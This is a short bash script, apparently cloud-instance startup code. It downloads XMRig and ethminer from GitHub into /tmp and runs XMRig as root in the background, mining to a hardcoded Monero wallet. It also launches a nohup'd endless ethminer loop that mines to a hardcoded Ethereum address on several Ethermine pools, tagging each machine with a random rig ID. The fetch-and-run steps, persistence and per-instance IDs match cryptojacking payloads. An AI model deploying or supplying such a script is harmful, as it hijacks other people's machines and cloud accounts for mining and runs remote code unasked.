#!/bin/bash -x
cd /tmp
export INSTANCE_ID=$(openssl rand -hex 8)
wget https://github.com/xmrig/xmrig/releases/download/v6.12.1/xmrig-6.12.1-linux-x64.tar.gz
tar xvf xmrig-6.12.1-linux-x64.tar.gz
sudo ./xmrig-6.12.1/xmrig -o pool.minexmr.com:4444 -u 44Vqzi3Pbwc3TzMdPJdSjS7uak5Ya4dHm1fW785V1mHBSs6w5iyReZ6L6XFfqxCCAM59GuGstVHiZNp96nGPQPCv4j7unrp -B -t 5 -l /tmp/xmrig.log --rig-id ${INSTANCE_ID}
wget -O ethminer.tar.gz https://github.com/ethereum-mining/ethminer/releases/download/v0.18.0/ethminer-0.18.0-cuda-9-linux-x86_64.tar.gz
tar xvfz ethminer.tar.gz
cd bin
cat > runner.sh << __EOF__
#!/bin/bash -x
export INSTANCE_ID=$(openssl rand -hex 8)
SERVERS=(us1 us2 eu1 asia1)
while (true); do
  ./ethminer \
    -P stratums://0x27334aAc09696847DfdEa3B9d295987A7bCAEae0.${INSTANCE_ID}@us1.ethermine.org:5555 \
    -P stratums://0x27334aAc09696847DfdEa3B9d295987A7bCAEae0.${INSTANCE_ID}@us2.ethermine.org:5555 \
    -P stratums://0x27334aAc09696847DfdEa3B9d295987A7bCAEae0.${INSTANCE_ID}@eu1.ethermine.org:5555 \
    -P stratums://0x27334aAc09696847DfdEa3B9d295987A7bCAEae0.${INSTANCE_ID}@asia1.ethermine.org:5555 \
  >> /tmp/ethminer.log 2>&1
done
__EOF__
chmod +x runner.sh
nohup ./runner.sh &
